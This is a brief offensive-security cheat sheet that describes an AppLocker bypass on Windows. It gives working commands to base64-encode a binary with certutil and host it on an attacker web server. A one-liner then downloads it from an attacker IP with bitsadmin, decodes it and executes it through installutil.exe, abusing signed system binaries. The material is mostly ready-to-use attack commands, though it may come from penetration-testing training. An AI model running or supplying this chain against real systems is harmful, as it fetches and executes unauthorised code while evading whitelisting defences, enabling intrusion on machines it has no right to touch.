# AppLocker Bypass PowerShell Runspace

1. Encode the binary into a (base64) text file with `CertUtil`.

```powershell
certutil -encode C:\Path\To\Binary.exe enc.txt
```

1. Upload and host the encoded binary `enc.txt` on the attackers web server.

1. We then run the following oneliner on the target to download, decode the encoded binary and use the combination of Microsoft-signed binaries to effectively bypass AppLocker.

```powershell
cmd.exe /c del C:\Windows\Tasks\enc.txt && del c:\Windows\Tasks\a.exe && bitsadmin /Transfer theJob http://192.168.45.179/enc.txt C:\Windows\Tasks\enc.txt && certutil -decode C:\Windows\Tasks\enc.txt C:\Windows\Tasks\a.exe && C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\Windows\Tasks\a.exe
```